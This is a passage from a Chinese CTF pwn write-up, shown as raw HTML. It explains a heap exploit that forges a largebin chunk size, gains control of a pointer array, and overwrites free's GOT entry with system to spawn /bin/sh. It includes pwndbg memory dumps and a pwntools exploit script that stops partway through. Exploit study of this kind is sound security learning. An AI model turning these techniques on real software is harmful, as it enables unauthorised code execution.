&lt;fake+32&gt;:\t0x00007ffff7bc4b78\t0x00007ffff7bc4b78<br>\n0x601370:\t0x0000000000000000\t0x0000000000000000<br>\n0x601380:\t0x0000000000000000\t0x0000000000000000<br>\n0x601390:\t0x0000000000000000\t0x0000000000000000<br>\n0x6013a0:\t0x0000000000000000\t0x0000000000000000<br>\n0x6013b0:\t0x0000000000000000\t0x0000000000000000<br>\n0x6013c0:\t0x0000000000000000\t0x0000000000000000<br>\n0x6013d0:\t0x0000000000000000\t0x0000000000000000<br>\n0x6013e0:\t0x0000000000000000\t0x0000000000000000</p>\n</blockquote>\n<p>add 之后</p>\n<blockquote>\n<p>pwndbg&gt; bins<br>\nfastbins<br>\nempty<br>\nunsortedbin<br>\nempty<br>\nsmallbins<br>\nempty<br>\nlargebins<br>\n0x80000-∞: 0x601350 (fake+16) —▸ 0x7ffff7bc5348 (main_arena+2088) ◂— 0x601350</p>\n</blockquote>\n<blockquote>\n<p>pwndbg&gt; x/20gx 0x601350<br>\n0x601350 &lt;fake+16&gt;:\t0x0000000000000000\t0x0000000000a00001<br>\n0x601360 &lt;fake+32&gt;:\t0x00007ffff7bc5348\t0x00007ffff7bc5348<br>\n0x601370:\t0x0000000000601350\t0x0000000000601350<br>\n0x601380:\t0x0000000000000000\t0x0000000000000000<br>\n0x601390:\t0x0000000000000000\t0x0000000000000000<br>\n0x6013a0:\t0x0000000000000000\t0x0000000000000000<br>\n0x6013b0:\t0x0000000000000000\t0x0000000000000000<br>\n0x6013c0:\t0x0000000000000000\t0x0000000000000000<br>\n0x6013d0:\t0x0000000000000000\t0x0000000000000000<br>\n0x6013e0:\t0x0000000000000000\t0x0000000000000000</p>\n</blockquote>\n<p>其实就是 unsortbin 遍历 size，满足切割分配的切割分配，大小精确匹配就分配，大小不匹配的就根据大小装入 largebin 和 smallbin。</p>\n<h5 id=\"3申请超大内存控制指针数组\"><a class=\"markdownIt-Anchor\" href=\"#3申请超大内存控制指针数组\">#</a> <strong>3. 申请超大内存控制指针数组</strong></h5>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ayload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token number\">0x00</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0xfffffffffffffff0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token number\">0x10</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0xfffffffffffffff1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'4'</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">13337</span><span class=\"token punctuation\">,</span><span class=\"token string\">'5'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>add 之前</p>\n<blockquote>\n<p>pwndbg&gt; bins<br>\nfastbins<br>\nempty<br>\nunsortedbin<br>\nempty<br>\nsmallbins<br>\nempty<br>\nlargebins<br>\n0x80000-∞: 0x601350 (fake+16) —▸ 0x7ffff7bc5348 (main_arena+2088) ◂— 0x601350</p>\n</blockquote>\n<blockquote>\n<p>pwndbg&gt; x/20gx 0x6012e0</p>\n<p>0x6012d0:\t0x0000000000000000\t0x0000000000000000</p>\n<p>0x6012e0 <ptr>:\t0x00007ffff6dff010\t0x0000000000602420<br>\n0x6012f0 &lt;ptr+16&gt;:\t0x0000000000602420\t0x0000000000602420<br>\n0x601300 &lt;ptr+32&gt;:\t0x0000000001002430\t0x0000000000000000<br>\n0x601310 &lt;ptr+48&gt;:\t0x0000000000000000\t0x0000000000000000<br>\n0x601320 &lt;ptr+64&gt;:\t0x0000000000000000\t0x0000000000000000<br>\n0x601330:\t0x0000000000000000\t0x0000000000000000<br>\n0x601340 <fake>:\t0xfffffffffffffff0\t0x0000000000000000<br>\n0x601350 &lt;fake+16&gt;:\t0x0000000000000000\t0xfffffffffffffff1<br>\n0x601360 &lt;fake+32&gt;:\t0x00007ffff7bc5348\t0x00007ffff7bc5348<br>\n0x601370:\t0x0000000000601350\t0x0000000000601350</p>\n</blockquote>\n<p>add 之后</p>\n<blockquote>\n<p>pwndbg&gt; bins<br>\nfastbins<br>\nempty<br>\nunsortedbin<br>\nall: 0x6012d0 —▸ 0x7ffff7bc4b78 (main_arena+88) ◂— 0x6012d0<br>\nsmallbins<br>\nempty<br>\nlargebins<br>\nempty</p>\n</blockquote>\n<blockquote>\n<p>pwndbg&gt; x/20gx 0x6012e0</p>\n<p>0x6012d0:\t0x0000000000000000\t0x0000000000000071</p>\n<p>0x6012e0 <ptr>:\t0x00007ffff7bc4b78\t0x00007ffff7bc4b78<br>\n0x6012f0 &lt;ptr+16&gt;:\t0x0000000000602420\t0x0000000000602420<br>\n0x601300 &lt;ptr+32&gt;:\t0x0000000001002430\t0x0000000000601360<br>\n0x601310 &lt;ptr+48&gt;:\t0x0000000000000000\t0x0000000000000000<br>\n0x601320 &lt;ptr+64&gt;:\t0x0000000000000000\t0x0000000000000000<br>\n0x601330:\t0x0000000000000000\t0x0000000000000000<br>\n0x601340 <fake>:\t0x0000000000000070\t0x0000000000000000<br>\n0x601350 &lt;fake+16&gt;:\t0x0000000000000000\t0xffffffffffffff81<br>\n0x601360 &lt;fake+32&gt;:\t0x00007ffff7bc5335\t0x00007ffff7bc5348<br>\n0x601370:\t0x0000000000601350\t0x0000000000601350</p>\n</blockquote>\n<p>可见这里无疑发生了发生了很大的变化</p>\n<p>largebin 被置入 unsortedbin 内</p>\n<p>接下来我们了解原因</p>\n<blockquote>\n<ol>\n<li>unsortedbin 处理完之后，从 largebin 中找满足大小要求的 chunk 分配，要么直接分配出去，要么切割分配出去，剩下的部分装入 unsortedbin</li>\n<li>largebin 中最大的 chunk 范围是 <code>0x80000 - ∞</code></li>\n<li><strong>从 largebin 中分配不检查申请大小是否超出系统内存</strong></li>\n</ol>\n</blockquote>\n<p>所以当我们申请超大内存时，由于我们将 largebin 的 size 置成 <code>0xfffffffffffffff1</code> ，所以等我们去申请 <code>0xFFFFFFFFFFFFFF70LL</code>  就会将剩余的 0x80 的 chunk 块放进 unsortedbin 内。</p>\n<h5 id=\"4劫持free\"><a class=\"markdownIt-Anchor\" href=\"#4劫持free\">#</a> <strong>4. 劫持 free</strong></h5>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'free'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>这就是申请一个 0x80 的 chunk 块，并将 ptr [0] 指向 free，接下来用 edit 写入程序自带的 system 即可，最后 free 掉内容为 <code>/bin/sh</code>  的 chunk 块即可</p>\n<h3 id=\"完整exp\"><a class=\"markdownIt-Anchor\" href=\"#完整exp\">#</a> 完整 exp：</h3>\n<blockquote>\n<p>脚本来源于网络</p>\n</blockquote>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>huan_attack_pwn</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># from LibcSearcher import *</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># context(arch='i386' , os='linux', log_level='debug')</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>binary <span class=\"token operator\">=</span> <span class=\"token string\">'./pwn'</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>libc <span class=\"token operator\">=</span> <span class=\"token string\">'./libc.so.6'</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># host, port = \":\".split(\":\")</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[31;40mremote\\033[0m: (y)\\n'</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token string\">'\\033[32;40mprocess\\033[0m: (n)'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">if</span> sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">'y'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\"># r = gdb.debug(binary)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\"># libc = cdll.LoadLibrary(libc)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #设置种子</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>default <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>                <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> time<span class=\"token operator\">=</span>default             <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>rpu     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">,</span>drop<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> length                   <span class=\"token punctuation\">:</span> <span class=\"token string\">b'Yhuan'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'Y'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>lg      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> log<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>var_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> ：0x</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">globals</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>var_name<span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span><span class=\"token format-spec\">x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>prl     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>var_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>debug   <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> command<span class=\"token operator\">=</span><span class=\"token string\">''</span>               <span class=\"token punctuation\">:</span> gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">,</span>command<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                          <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'your choice >\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre> </pre></td></tr><tr><td data-num=\"51\"></td><td><pre> </pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token comment\"># 1 0x10</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token comment\"># 2 0x80</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token comment\"># 3 0xA0000</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>nb<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    cmd<span class=\"token punctuation\">(</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    ru<span class=\"token punctuation\">(</span><span class=\"token string\">b'Add>>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>nb<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    ru<span class=\"token punctuation\">(</span><span class=\"token string\">b'idx>>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    se<span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre> </pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">,</span>content2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    cmd<span class=\"token punctuation\">(</span><span class=\"token string\">'3'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    ru<span class=\"token punctuation\">(</span><span class=\"token string\">'Edt>>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    ru<span class=\"token punctuation\">(</span><span class=\"token string\">'addr>>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>    se<span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>    ru<span class=\"token punctuation\">(</span><span class=\"token string\">'content>>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>    se<span class=\"token punctuation\">(</span>content2<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">47</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre> </pre></td></tr><tr><td data-num=\"71\"></td><td><pre> </pre></td></tr><tr><td data-num=\"72\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dele</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>    cmd<span class=\"token punctuation\">(</span><span class=\"token string\">'2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>    ru<span class=\"token punctuation\">(</span><span class=\"token string\">'Del>>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>    sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token string\">'2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>payload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>    <span class=\"token number\">0x00</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>    <span class=\"token number\">0x10</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0x11</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>    <span class=\"token number\">0x20</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0x601350</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">'3'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre></pre></td></tr><tr><td data-num=\"93\"></td><td><pre></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>payload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>    <span class=\"token number\">0x00</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>    <span class=\"token number\">0x10</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0xa00001</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'/bin/sh'</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">'4'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre></pre></td></tr><tr><td data-num=\"101\"></td><td><pre></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>payload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>    <span class=\"token number\">0x00</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0xfffffffffffffff0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token 